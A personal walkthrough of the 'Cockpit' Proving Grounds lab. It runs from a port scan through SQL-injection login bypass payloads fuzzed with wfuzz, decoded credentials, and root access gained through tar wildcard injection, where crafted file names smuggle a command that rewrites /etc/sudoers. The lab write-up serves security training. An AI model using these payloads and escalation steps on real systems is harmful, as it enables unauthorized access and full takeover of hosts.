`Running all scans on 192.168.190.10`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT     STATE SERVICE`
`22/tcp   open  ssh`
`80/tcp   open  http`
`9090/tcp open  zeus-admin`

Port 80 nmap with http-enum script
`| http-enum:` 
`|   /login.php: Possible admin folder`
`|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'`
`|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'`
`|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

Port 9090 is a web login form
![[Pasted image 20240209203443.png]]

Tried the basic weak admin:admin, admin:password - no success.

Putting this into the username field of login.php on port 80 it shows MySQL error.
`admin' UNION SELECT username || '~' || password FROM users--`

So we have SQL injection.

In the Seclists wordlists, we have seclists/Fuzzing/Databases/MySQL.fuzzdb.txt

Fuzzing with this doesn't work so let's look at the other MySQL wordlist.  /usr/share/seclists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt

![[Pasted image 20240209203942.png]]
Clean this up. 
`└─$ cat fuzz.txt`                                                                
`' OR 1=1--`
`'OR '' = '`
`'--`
`' union select 1, 'id', 'password' 1--`
`'OR 1=1--`

FUZZ

`─$ wfuzz -c -z file,fuzz.txt -d "username=FUZZ&password=test" --follow "http://192.168.190.10/login.php"`
 `/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.`
`********************************************************`
* `Wfuzz 3.1.0 - The Web Fuzzer                         *`
`********************************************************`

`Target: http://192.168.190.10/login.php`
`Total requests: 5`

`=====================================================================`
ID           Response   Lines    Word       Chars       Payload                                                                                                       
=====================================================================

`000000004:   200        15 L     82 W       810 Ch      "' union select 1, 'id', 'password' 1--"`                                                                      
`000000005:   200        15 L     82 W       807 Ch      "'OR 1=1--"`                                                                                                   
`000000003:   200        15 L     82 W       809 Ch      "'--"`                                                                                                         
`000000001:   200        10 L     28 W       233 Ch      "' OR 1=1--"`                                                                                                  
`000000002:   200        49 L     71 W       976 Ch      "'OR '' = '"`                                                                                                  

`Total time: 0`
`Processed Requests: 5`
`Filtered Requests: 0`
`Requests/sec.: 0`

We can eliminate the first 3 since the lines are the same. Let's try the last 2.

`'OR '' = '` gets us logged in.

![[Pasted image 20240209212946.png]]

`┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Cockpit]`
`└─$ echo 'Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=' | base64 -d`           
`canttouchhhthiss@455152`                                                                                                                                                                               
`┌──(user㉿kalipurple)-[~/Offsec/ProvingGrounds/Cockpit]`
`└─$ echo 'dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy' | base64 -d` 
`thisscanttbetouchedd@455152` 

Try these again in 192.168.190.10/login.php but they don't work there.
Try the other login form we found on port 9090.

james:canttouchhhthiss@455152 works and we're in.

We see terminal in the menu, let's see what we can do.
![[Pasted image 20240209213328.png]]

`james@blaze:~$ sudo -l`
`Matching Defaults entries for james on blaze:`
    `env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin`

`User james may run the following commands on blaze:`
    `(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *`

We can run tar with sudo but we're limited by the asterisk.

We find this in google:
https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa

It's possible to create 2 files that will execute when being tar'd. The 2nd file can execute another script.

`echo "" > '--checkpoint=1'`
`echo "" > '--checkpoint-action=exec=sh privesc.sh'`

`echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers`

Make the files, execute, get root, and get the flags.

`james@blaze:~$ echo "" > '--checkpoint=1'^C`
`james@blaze:~$ cd /tmp`
`james@blaze:/tmp$ mkdir new`
`james@blaze:/tmp$ cd new`
`james@blaze:/tmp/new$ echo "" > '--checkpoint=1'`
`james@blaze:/tmp/new$ echo "" > '--checkpoint-action=exec=sh privesc.sh'`
`james@blaze:/tmp/new$ vi privesc.sh`
`james@blaze:/tmp/new$ cat privesc.sh`
`#!/bin/bash`

`echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers`
`james@blaze:/tmp/new$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *`
`privesc.sh`
`james@blaze:/tmp/new$ sudo su -`
`root@blaze:~# cat /root/proof.txt`
`9422692c03028ba3e06f210cdbf61161`
`root@blaze:~# cat /home/james/local.txt`
`05355a7004e846fe37b859eaade90f27`

